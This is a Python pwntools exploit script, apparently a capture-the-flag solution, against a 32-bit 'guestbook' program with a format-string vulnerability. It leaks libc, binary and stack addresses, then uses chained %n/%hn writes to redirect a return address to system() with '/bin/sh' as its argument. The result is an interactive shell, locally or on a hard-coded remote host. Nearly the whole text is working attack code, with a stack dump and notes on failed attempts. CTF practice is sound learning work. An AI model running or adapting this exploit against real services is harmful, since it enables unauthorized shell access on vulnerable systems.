# ffae:baa0|ffaebac5|....|
# ffae:baa4|000000f7|....|
# ffae:baa8|565fd044|D._V|
# ffae:baac|565fae3a|:._V|return to 0x565fae3a
# ffae:bab0|00000001|....|
# ffae:bab4|f777dda7|..w.|
# ffae:bab8|00000000|....|

from pwn import *
g_local = True

if g_local:
	sh=process("./guestbook")
else:
	sh=remote("47.100.64.171", 20002)


#pre: your choice
#post: your choice
def add_guest(szName, szPhone):
	global sh
	sh.send("1")
	sh.recvuntil("your name?\n")
	#print sh.recv()
	sh.send(szName)
	sh.recvuntil("your phone?\n")
	sh.send(szPhone)
	print sh.recvuntil("your choice:\n")

#pre: your choice
#post: your choice
def see_guest(iIndex):
	global sh
	sh.send("2")
	sh.recvuntil("input the guest index:\n")
	sh.send(str(iIndex))

	print sh.recv(len("the name:"))
	ret = sh.recvuntil("your choice:\n")
	print ret
	iEnd = ret.find("\nthe phone:")
	return ret[0:iEnd]

def get_guest_base(szName):
	return int(szName.split(" ")[0]) - 0xe3a # 0xe3a is the displacement
def get_libc_base(szName):
	return int(szName.split(" ")[2]) - 0x1b2da7 # displacement too
def get_stack_from_72(szName):
	return int(szName.split(" ")[1])

#pre: your choice
#post: your choice or shell?
def del_guest(iIndex):
	global sh
	sh.send("3")
	sh.recvuntil("Plz input the guest index:\n")
	sh.send(str(iIndex))
	sh.recvuntil("your choice:\n")

#0. add guest with name /bin/sh
#1. add guest with name %u %u %u and show to get the base addr
#2. %(&phone[1].p)x%72$n
#3. %(guests[0].name)x%80$n
#4. %(free GOT)x%72$n
#5. %(system addr)x%80$n

#failed, e8 call donot use GOT
#1. add guest with name %u %72$u %u and show to get the base addr

#add_guest("%"+str(guestbook+0x3063+0x28+1)+"x%72$n", "1") # 2
#add_guest("%"+str(guestbook+0x3040+4)+"x%80$n", "1") # 3
# add_guest("%"+str(guestbook+0x2fc0)+"x%72$n", "1") # 4
# add_guest("%"+str(libc+0x0003a940)+"x%80$n", "1") # 5
#rewrite GOT doesnot work...

#pre: iDst and iNum is smaller than 0x7fffffff
#the next two gust index is 2 and 3
def dword_shoot(iDst, iNum, idx1, idx2):
	add_guest("%"+str(iDst)+"x%72$n", "1")
	add_guest("%"+str(iNum)+"x%80$n", "1")
	see_guest(idx1)
	see_guest(idx2)
	del_guest(idx1)
	del_guest(idx2)
#iNum < 0x7fffffff
def stack_shoot_dword(addr_72, displacement, iNum, idx1, idx2):
	addr = (addr_72 + displacement * 4) & 0xffff
	add_guest("%"+str(addr)+"x%72$hn", "1")
	add_guest("%"+str(iNum)+"x%80$n", "1")
	#83 132 not stable
	see_guest(idx1)
	see_guest(idx2)
	del_guest(idx1)
	del_guest(idx2)
#iNum < 0xffff
def stack_shoot_word(addr_72, displacement, iNum, idx1, idx2):
	addr = (addr_72 + displacement * 2) & 0xffff
	add_guest("%"+str(addr)+"x%72$hn", "1")
	add_guest("%"+str(iNum)+"x%80$hn", "1")
	see_guest(idx1)
	see_guest(idx2)
	del_guest(idx1)
	del_guest(idx2)

add_guest("/bin/sh\x00", "1") #index 0
add_guest("%1$u %72$u %3$u", "1") #index 1
szName = see_guest(1)
del_guest(1)
libc = get_libc_base(szName)
guestbook = get_guest_base(szName)
from_72 = get_stack_from_72(szName)
system_addr = libc+ 0x03ada0# given 0x0003a940
guestStruct = guestbook+0x3040
phoneStruct = guestbook+0x3063
structSize = 0x28 # both struct are 0x28
# +1 is the pointer to the phone in the heap
# +4 is the array of the name

# bin_sh = from_72 - 5 * 4;
ret = from_72 - 7 * 4
# print hex(from_72)
# print hex(ret)
# print hex(bin_sh)

add_guest("%"+str(system_addr>>16)+"x%87$hn", "1")
#correspond to 14 that is going to be return addr + 2
add_guest("%"+str(system_addr&0xffff)+"x%84$hn", "1")
#correspond to 8 that is going to be ret addr

stack_shoot_word(from_72, 8, (ret) & 0xffff, 3, 4)
stack_shoot_word(from_72, 14, (ret + 2) & 0xffff, 3, 4)
#change 8 14 into the ret addr and ret addr+2

print (guestStruct+4)
stack_shoot_dword(from_72, -5, guestStruct+4, 3, 4)# -5
#shoot addr of "/bin/sh" into the position that is going to be the first argument

dword_shoot(phoneStruct+structSize+1, guestStruct+structSize*2+4, 3, 4)
#shoot shoot the index 1 phone as name of index 2

sh.send("2")
sh.recvuntil("input the guest index:\n")
sh.send(str(1))

sh.interactive()
